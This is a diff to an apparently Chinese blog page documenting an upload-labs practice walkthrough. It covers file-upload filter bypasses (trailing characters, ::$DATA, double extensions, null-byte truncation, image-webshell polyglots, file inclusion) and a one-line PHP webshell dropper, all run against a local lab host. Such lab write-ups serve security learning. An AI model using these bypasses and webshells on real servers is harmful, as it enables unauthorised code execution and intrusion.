@@ -145,7 +145,67 @@
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240109150119248.png" alt="image-20240109150119248"></p>
 <p>成功</p>
-<h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><h4 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h4><p>创建文件3.php</p>
+<h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p>拦截上传</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115112926228.png" alt="image-20240115112926228"></p>
+<p>在1.php后面添加一个空格</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115113009524.png" alt="image-20240115113009524"></p>
+<p>放行拦截</p>
+<p>上传成功</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115113035729.png" alt="image-20240115113035729"></p>
+<h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p>和7类似</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115143514883.png" alt="image-20240115143514883"></p>
+<p>在1.php后加.</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115143542325.png" alt="image-20240115143542325"></p>
+<h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p>和7类似</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115143811051.png" alt="image-20240115143811051"></p>
+<p>在1.php后添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::$$data</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115143854429.png" alt="image-20240115143854429"></p>
+<h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p>和9类似</p>
+<p>在1.php后加上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .</span><br></pre></td></tr></table></figure>
+
+<h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><p>拦截抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.pphphp&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115145706935.png" alt="image-20240115145706935"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115145722178.png" alt="image-20240115145722178"></p>
+<h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p>拦截抓包</p>
+<p>在save_path&#x3D;..&#x2F;upload&#x2F;后添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115154036955.png" alt="image-20240115154036955"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115153715839.png" alt="image-20240115153715839"></p>
+<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>拦截抓包</p>
+<p>把php文件后缀改为jpg</p>
+<p>上传抓包</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115160200048.png" alt="image-20240115160200048"></p>
+<p>在upload后添加1.php ，php后面有个空格</p>
+<p>点击hex</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115160308346.png" alt="image-20240115160308346"></p>
+<p>找到20代表的空格，改为00</p>
+<p>放行</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115160418529.png" alt="image-20240115160418529"></p>
+<p>上传成功</p>
+<p>删除1.php后缀即可。</p>
+<h4 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jpg格式图片的文件头标识：FFD8开头FFD9结尾</span><br><span class="line">Png格式图片的文件头标识：89 20 4E 47 0D 0A</span><br><span class="line">Gif格式图片的文件头标识：GIF89a GIF87a</span><br></pre></td></tr></table></figure>
+
+<p>准备一份正常jpg图片加上马</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115163829804.png" alt="image-20240115163829804"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\love.jpg/b+.\1.php 12.jpg</span><br></pre></td></tr></table></figure>
+
+<p>上传新生成的文件</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115192944465.png" alt="image-20240115192944465"></p>
+<p>复制图片路径</p>
+<p>进入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.33.131/upload-labs-master/include.php?file=./upload/8920240115192738.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115193029765.png" alt="image-20240115193029765"></p>
+<p>使用蚁剑连接</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240115193106900.png" alt="image-20240115193106900"></p>
+<p>成功</p>
+<h4 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h4><p>创建文件3.php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">fputs(fopen(&#x27;../p.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>上传文件3.php</p>
